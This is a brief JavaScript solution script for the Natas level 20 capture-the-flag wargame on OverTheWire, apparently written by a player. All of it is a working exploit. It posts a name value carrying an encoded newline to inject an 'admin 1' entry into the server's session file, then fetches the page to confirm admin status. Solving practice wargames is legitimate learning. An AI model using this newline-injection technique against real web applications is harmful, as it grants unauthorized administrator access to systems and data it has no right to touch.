url = 'http://natas20.natas.labs.overthewire.org/index.php?debug';
params = 'name=%0Aadmin%201'; //Note both %0A and %0D works here
truestring = "<br>You are an admin";

//Writes to session file
xhr = new XMLHttpRequest();
xhr.open('POST',url,false);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.send(params);

//Reads from session file
xhr2 = new XMLHttpRequest();
xhr2.open('GET',url,false);
xhr2.onload = function () {
	if (xhr2.responseText.includes(truestring)) {
		console.log(xhr2.responseText);
	}
};
xhr2.send();
